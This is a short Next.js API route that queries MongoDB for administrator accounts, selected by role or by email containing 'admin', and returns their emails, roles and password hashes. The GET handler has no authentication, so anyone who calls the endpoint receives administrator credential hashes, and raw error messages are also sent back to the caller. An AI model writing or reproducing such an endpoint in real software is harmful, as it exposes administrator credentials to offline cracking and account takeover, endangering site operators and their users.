import dbConnect from '@/lib/mongodb';
import User from '@/models/User';

export const dynamic = 'force-dynamic';

export async function GET() {
  try {
    await dbConnect();
    
    let admins = await User.find({ $or: [{ role: 'super_admin' }, { email: /admin/i }] }).select('+password');
    
    return Response.json({ 
      success: true, 
      count: admins.length,
      admins: admins.map(a => ({
        id: a._id,
        email: a.email,
        name: a.name,
        role: a.role,
        isActive: a.isActive,
        passwordHash: a.password
      }))
    });
  } catch (err) {
    return Response.json({ success: false, error: err.message });
  }
}
